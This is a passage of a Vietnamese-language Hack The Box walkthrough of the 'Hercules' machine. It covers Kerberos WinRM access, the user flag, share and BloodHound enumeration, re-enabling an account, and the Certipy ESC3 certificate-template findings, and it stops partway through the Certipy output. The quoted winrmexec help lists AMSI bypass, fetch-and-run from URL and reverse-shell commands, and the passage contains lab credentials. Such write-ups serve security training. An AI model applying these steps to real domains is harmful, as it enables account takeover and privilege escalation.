![image](/assets/images/HTB/season9/Hercules/image%2072.png)

Giờ thì mình biết **`Auditor`** là thành viên của **`REMOTE MANAGEMENT@HERCULES.HTB`** , vì vậy mình có thể remote tới nó thông qua **`evil-winrm`** nhưng mà kết quả từ **`nmap`** ở trên chỉ cho thấy chỉ duy nhất port **`5986`** đang mở. 

→ vì vậy mình dùng winrmexec với cái options mà nó hỗ trợ. 

- https://github.com/ozelis/winrmexec

```bash
                                                                                                                                                                                             
**┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ export KRB5CCNAME=~/Desktop/Auditor.ccache 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ klist
Ticket cache: FILE:/home/kali/Desktop/Auditor.ccache
Default principal: Auditor@HERCULES.HTB

Valid starting       Expires              Service principal
11/30/2025 12:09:00  11/30/2025 22:09:00  krbtgt/HERCULES.HTB@HERCULES.HTB
        renew until 12/01/2025 12:08:55
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/remote_tool/winrmexec]
└─$ python3 evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\Auditor
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\auditor\Documents>**
```

```bash
**PS C:\Users\auditor\Documents> cd ..\Desktop
PS C:\Users\auditor\Desktop> dir

    Directory: C:\Users\auditor\Desktop

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        11/29/2025   4:04 PM             34 user.txt                                                              

PS C:\Users\auditor\Desktop> type user.txt
ff8533e6acd7c892e4fb84e2ed2f7a27
PS C:\Users\auditor\Desktop>**

```

Từ đây thì mình đã có thể lấy flag user rồi. 

### Initial Access

---

Sau khi mình đã có **`Auditor`** , mình thực hiện recon thông tin từ trong session này. 

### Discovery

---

```bash
**PS C:\Users\auditor\Desktop> cd C:\Shares
PS C:\Shares> dir

    Directory: C:\Shares

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Department                                                            
d-----         12/4/2024  11:45 AM                Users                                                                 

PS C:\Shares> cd Department
PS C:\Shares\Department> dir

    Directory: C:\Shares\Department

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Engineering Department                                                
d-----         12/4/2024  11:45 AM                IT                                                                    
d-----         12/4/2024  11:45 AM                Recruitment                                                           
d-----         12/4/2024  11:45 AM                Security Department                                                   
d-----         12/4/2024  11:45 AM                Web Department                                                        

PS C:\Shares\Department>**

```

Mình đã tim thấy 1 vài folder tại **`C:\Shares\Department`** 

Mình sẽ thử kiểm tra và show ra thông tin nào quan trọng. 

```bash
**PS C:\Shares\Department\IT> dir

    Directory: C:\Shares\Department\IT

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:45 AM           1048 cleanup.lnk                                                           
-a----         12/4/2024  11:15 AM            935 notice.eml                                                            

PS C:\Shares\Department\IT>**
```

Sau khi check 1 hồi thì có **`IT`** với **`cleanup.lnk`** → 1 Shortcut của Windows. 

Và file **`notice.eml`** là format cho việc save electronic mail message bao gồm người gửi, người nhận, tiêu đề, nội dung, và file đính kèm.

→ Nên mình kiểm tra. 

```bash
**PS C:\Shares\Department\IT> type notice.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
        boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
________________________________
From: Ashley Browne
Sent: Tuesday 10:17:27 AM
To: IT Support <HERCULES\IT Support@HERCULES.HTB>
Subject: Password Reset

Hey Team,

The Administration has provided a solution to much of the permission issues=
some of you have been facing.

If you are having problems changing a password, the instructions are:

1) Check AD Permissions against the user.
2) Run the shortcut provided in the share.
3) Try to reset the password again.

If all else fails, send me a message.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable**
```

Mình đã có mail gủi từ **`Ashley.b`** tới **`IT Support`** nói về việc thay đổi password và vấn đề quyền cũng như đề cập tới chạy file shortcut trong share. 

```bash
**PS C:\Shares\Department\IT> type cleanup.lnk
LÀF‹ ƒj&îEÛ_Òl&îEÛ_Òl&îEÛf½PàOÐ ê:i¢+00/C:\x1„Y™
Usersd  ï¾¨RÚ@„Y™
. :¿§ÎUsers@shell32.dll,-21813Z1„Y§
ashley.bB       ï¾„Y˜
„Y§
.ÿW v)ashley.b▒V1„Y§
Desktop@        ï¾„Y˜
„Y§
.       X‡u0Desktopf2f„Y¥
 aCleanup.ps1J  ï¾„Y¥
„Y¥
.ÏX     ¡ÊaCleanup.ps1U-TU½´^C:\Users\ashley.b\Desktop\aCleanup.ps1,..\..\..\Users\ashley.b\Desktop\aCleanup.ps1 ÿÿÿÿ¥
                                                                                                                       rÒb
Å°K£‚i}Ír›€¥` XdcÁ›à±ï¤'ˆGÍÁ›à±ï¤'ˆGÍÎ   ‰1SPSâŠXF¼L8C»ü“&˜mÎm-S-1-5-21-1889966460-2597381952-958560702-50091SPS±mD­pH§H@.¤=xŒhH>.ôäP
PS C:\Shares\Department\IT>**

```

Nhìn thấy nó show Path gốc của cleanup script → **`C:\Users\ashley.b\Desktop\aCleanup.ps1`** → hmm mình nghĩ có thể dùng này để leo quyền. 

Giờ thì mình cần tìm bên trong **`Auditor`** , giờ mình sẽ chạy **`bloodhound`** để xem thử coi có thu được thông tin gì ko. 

![image](/assets/images/HTB/season9/Hercules/image%2073.png)

Mình lại tiếp tục check và import thông tin mình thu được vào BloodHound 

Và nhớ lại lúc đầu thì **`Auditor`** là member của 4 group bao gồm **`Forest Management`** 

```bash
**PS C:\Shares\Department> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HERCULES\Domain Employees                  Group            S-1-5-21-1889966460-2597381952-958560702-1108 Mandatory group, Enabled by default, Enabled group
HERCULES\Forest Management                 Group            S-1-5-21-1889966460-2597381952-958560702-1104 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192**                             
```

Giờ thì mình check group này. 

![image](/assets/images/HTB/season9/Hercules/image%2074.png)

Thì thấy **`FOREST MANANGEMENT@HERCULES.HTB`** có **`GenericAll`** qua **`FOREST MIGRATION@HERCULES.HTB`** 

→ Kiểm tra **`FOREST MIGRATION@HERCULES.HTB`** 

![image](/assets/images/HTB/season9/Hercules/image%2075.png)

Nhìn thấy thì mình có thể **`WriteDacl`** tới **`ADMINISTRATOR@HERCULES.HTB`** mà bao gồm **`admin`** và cũn có thể **`GenericAll`** tới **`DOMAIN ADMINISTRATOR@HERCULES.HTB`** để lấy **`Aministrator`** 

→ Vậy mình chọn **`GenericAll`** trên **`FOREST MIGRATION@HERCULES.HTB`** OU tới **`Auditor`** 

![image](/assets/images/HTB/season9/Hercules/image%2076.png)

Sau đó, mình lại tiếp tục dùng **powerview.py** 

→ Mình sẽ enum với **`Get-ADObject`** để lấy hết tất cả object domain trong AD. 

![image](/assets/images/HTB/season9/Hercules/image%2077.png)

Mình bị là nó trả ra quá nhiều thông tin → mình ko biết đươc account nào có thể hoạt động được hoặc ko và nếu như vậy thì mình phải tiến hành kích hoạt. 

Để đảm bảo chắc chắn thì mình dùng [**RustHound-CE**](https://github.com/g0h4n/RustHound-CE) cũng như **`bloodhound-python`** để có thể collect data và chuyển đổi để dùng trong **`Bloodyhound Legacy`** 

- https://github.com/g0h4n/RustHound-CE

→ Giờ thì mình bắt đầu bằng với **`bloodhound-cli`** và mình chỉnh sửa thay đổi 1 vài thứ. 

> Mình vẫn có thể dùng **`rusthound-ce`** hoặc **`bloodhound-python-ce`** để thu thập data có thể dùng với **`Bloodhound CE`** và **`Bloodhound Legacy`** cho **`bloodhoun-python`**
> 

Sau khi cài xong, mình tới **`~/.config/bloodhound`** và kiểm tra file **`docker-compose.yml`** và mình chỉnh lại:

```bash
**bloodhound:
    labels:
      name: bhce_bloodhound
    image: docker.io/specterops/bloodhound:${BLOODHOUND_TAG:-latest}** 
```

Mình thay đổi lại thành 7.4.1

```bash
**bloodhound:
    labels:
      name: bhce_bloodhound
    image: docker.io/specterops/bloodhound:7.4.1**
```

```bash
**┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
└─$ ./rusthound-ce -d hercules.htb -u auditor -p 'Hoangphuc123@' -n 10.10.11.91 -c DCOnly
---------------------------------------------------
Initializing RustHound-CE at 16:30:11 on 11/30/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-11-30T09:30:11Z INFO  rusthound_ce] Verbosity level: Info
[2025-11-30T09:30:11Z INFO  rusthound_ce] Collection method: DCOnly
[2025-11-30T09:30:11Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-11-30T09:30:11Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-11-30T09:30:12Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:30:15Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-11-30T09:30:15Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:30:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-11-30T09:30:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:30:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-11-30T09:30:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:30:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-11-30T09:30:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:30:23Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-11-30T09:30:23Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 3%                                                                                  [2025-11-30T09:30:23Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2025-11-30T09:30:23Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 50 users parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_users.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_groups.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_computers.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_ous.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_domains.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_gpos.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_containers.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_ntauthstores.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_aiacas.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_rootcas.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_enterprisecas.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_certtemplates.json created!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-11-30T09:30:23Z INFO  rusthound_ce::json::maker::common] .//20251130163023_hercules-htb_issuancepolicies.json created!

RustHound-CE Enumeration Completed at 16:30:23 on 11/30/25! Happy Graphing!**
```

Mình nhìn thấy thì có nhiều output khác nhau nà mình ko thể nhìn thấy **`bloodhound-python`** 

Và điều này nó chỉ bổ sung thêm những gì mình đang thực hiện trong mục tiêu dùng kerberos để mình có thể tạo **`/etc/krb5.conf`** và chạy lại với options **`-k`** mà ko cần cung cấp mật khẩu và tên người dùng. 

```bash
**┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
└─$ nxc smb dc.hercules.htb -u ken.w -p 'change*th1s_p@ssw()rd!!' -k --generate-krb5-file krb5.conf
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
                                                                                                            
┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
└─$ sudo mv krb5.conf /etc/krb5.conf 
[sudo] password for kali: 
                                                                                                            
┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
└─$ cat /etc/krb5.conf                  

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = HERCULES.HTB

[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
        default_domain = hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB**
```

```bash
**┌──(kali㉿kali)-[~/…/RustHound-CE/RustHound-CE/target/release]
└─$ ./rusthound-ce -d hercules.htb -f dc.hercules.htb -c All -k -no-pass -z              
---------------------------------------------------
Initializing RustHound-CE at 16:39:42 on 11/30/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-11-30T09:39:42Z INFO  rusthound_ce] Verbosity level: Info
[2025-11-30T09:39:42Z INFO  rusthound_ce] Collection method: All
[2025-11-30T09:39:45Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-11-30T09:39:45Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-11-30T09:39:45Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:39:56Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-11-30T09:39:56Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:40:02Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-11-30T09:40:02Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:40:07Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-11-30T09:40:07Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:40:09Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-11-30T09:40:09Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-30T09:40:10Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-11-30T09:40:10Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 2%                                                                                  [2025-11-30T09:40:10Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2025-11-30T09:40:10Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 50 users parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-11-30T09:40:10Z INFO  rusthound_ce::json::maker::common] .//20251130164010_hercules-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 16:40:10 on 11/30/25! Happy Graphing!**

```

Mình có thể nhìn thấy rằng kết quả cũng khá giống nhau nhưng mà dùng kerberos authentication là cách an toàn hơn cho credentials và lén lút hơn. 

→ giờ thì mình tìm kiếm path từ **`auditor`** tới **`admin`** để nhìn thấy nếu mình có nhiều thông tin thì mình có thể exploit được. 

![image](/assets/images/HTB/season9/Hercules/image%2078.png)

Sự khác biệt lớn nhất, nhìn thấy `FOREST MIGRATION@HERCULES.HTB` bao gồm `fernando.r` là thành viên của `SMARTCARD OPERATORS@HERCULES.HTB` và mình có thể `ADCSESC3` tới `HERCULES.HTB` 

→ Cho nên mình check user `fernando.r` 

![image](/assets/images/HTB/season9/Hercules/image%2079.png)

Nhìn thấy là `fernando.r` thì chưa enable

→ nhấp double-check vào `FOREST MIGRATION@HERCULES.HTB` để xem nó bao gồm user nào nữa. 

![image](/assets/images/HTB/season9/Hercules/image%2080.png)

Chú ý là **`iis_administrator@hercules.htb`** có tiềm năng nên mình giữa này để khám phá sau.

⇒ Quay lại với **`fernando.r`** , mình sẽ re-enable nó dể thực hiện **`ESC3`** attack

![image](/assets/images/HTB/season9/Hercules/image%2081.png)

![image](/assets/images/HTB/season9/Hercules/image%2082.png)

→ check lại tại user **`fernando.r`** 

![image](/assets/images/HTB/season9/Hercules/image%2083.png)

Nó đã bật lên ⇒ True. 

Từ đây mình reset lại password. 

![image](/assets/images/HTB/season9/Hercules/image%2084.png)

### ESC3

---

![image](/assets/images/HTB/season9/Hercules/image%2085.png)

Mình có thể dùng [**Certipy**](https://github.com/ly4k/Certipy) để exploit theo các bước mà BloodHound-CE show ra cho mình. 

> Tìm hiểu thêm [ESC3: Enrollment Agent Certificate Tempalte](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template)
> 

![image](/assets/images/HTB/season9/Hercules/image%2086.png)

Đầu tiên mình cần lấy TGT cho **`fernando.r`** 

![image](/assets/images/HTB/season9/Hercules/image%2087.png)

Do password cũ bị sai nên đổi lại **`Hoangphuc123@`** 

```bash
**┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
└─$ export KRB5CCNAME=~/Desktop/fernando.r.ccache 
                                                                                                                                                                                      
┌──(certipy-env)─(kali㉿kali)-[~/Desktop/shadow_credentials]
└─$ certipy-ad find -k -target dc.hercules.htb -dc-ip 10.10.11.91 -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
